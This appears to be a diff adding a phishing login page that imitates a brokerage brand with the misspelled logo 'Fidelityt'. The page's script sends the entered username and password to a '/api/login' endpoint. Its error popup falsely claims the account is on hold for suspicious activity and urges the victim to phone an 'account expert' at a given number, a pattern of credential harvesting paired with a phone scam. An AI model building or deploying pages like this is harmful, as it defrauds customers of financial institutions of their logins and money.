@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FinTrust Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#f3f3f3;
+    color:#111;
+}
+
+.main{
+    max-width:520px;
+    margin:auto;
+    background:#f7f7f7;
+    min-height:100vh;
+}
+
+.content{
+    padding:28px 24px 60px;
+}
+
+.logo{
+    color:#2f8d2d;
+    font-size:62px;
+    font-weight:800;
+    margin-bottom:60px;
+    letter-spacing:-3px;
+}
+
+.title{
+    font-size:58px;
+    font-weight:700;
+    margin-bottom:36px;
+}
+
+.label{
+    display:block;
+    margin-bottom:10px;
+    font-size:18px;
+    font-weight:700;
+}
+
+.input{
+    width:100%;
+    height:72px;
+    border-radius:18px;
+    border:2px solid #808080;
+    background:white;
+    padding:0 18px;
+    font-size:20px;
+    margin-bottom:24px;
+}
+
+.pass-wrap{
+    position:relative;
+}
+
+.eye{
+    position:absolute;
+    right:22px;
+    top:22px;
+    font-size:22px;
+    cursor:pointer;
+}
+
+.login-btn{
+    width:100%;
+    height:72px;
+    border:none;
+    border-radius:45px;
+    background:#338d27;
+    color:white;
+    font-size:31px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+.popup{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.45);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+}
+
+.popup-box{
+    width:100%;
+    max-width:360px;
+    background:white;
+    border-radius:20px;
+    padding:30px;
+    text-align:center;
+}
+
+.popup-box button{
+    margin-top:24px;
+    width:100%;
+    height:52px;
+    border:none;
+    border-radius:12px;
+    background:#338d27;
+    color:white;
+    font-size:18px;
+    cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="main">
+
+<div class="content">
+
+    <div class="logo">Fidelityt</div>
+
+    <div class="title">Log in</div>
+
+    <label class="label">Username</label>
+    <input class="input" id="username" type="text">
+
+    <label class="label">Password</label>
+
+    <div class="pass-wrap">
+        <input class="input" id="password" type="password">
+        <span class="eye" onclick="togglePassword()">👁️</span>
+    </div>
+
+    <button class="login-btn" onclick="loginUser()">
+        Log in
+    </button>
+
+</div>
+
+</div>
+
+<div class="popup" id="popup">
+
+    <div class="popup-box">
+
+        <h3>Login Error</h3>
+
+        <p>
+            Due to some suspicious activity your account is on HOLD!
+kindly call the fidelity account expert to unhold the account +1(806) 370-7176
+        </p>
+
+        <button onclick="closePopup()">OK</button>
+
+    </div>
+
+</div>
+
+<script>
+
+async function loginUser(){
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    if(!username || !password){
+        alert("Please fill all fields");
+        return;
+    }
+
+    try{
+
+        const response = await fetch("/api/login", {
+
+            method:"POST",
+
+            headers:{
+                "Content-Type":"application/json"
+            },
+
+            body:JSON.stringify({
+                username,
+                password
+            })
+
+        });
+
+        const data = await response.json();
+
+        if(data.success){
+
+            alert("Login successful");
+
+            window.location.href = "/dashboard";
+
+        }else{
+
+            showPopup();
+
+        }
+
+    }catch(error){
+
+        alert("Server error");
+
+    }
+
+}
+
+function showPopup(){
+    document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup(){
+    document.getElementById("popup").style.display = "none";
+}
+
+function togglePassword(){
+
+    const pass = document.getElementById("password");
+
+    if(pass.type === "password"){
+        pass.type = "text";
+    } else {
+        pass.type = "password";
+    }
+
+}
+
+</script>
+
+</body>
+</html>
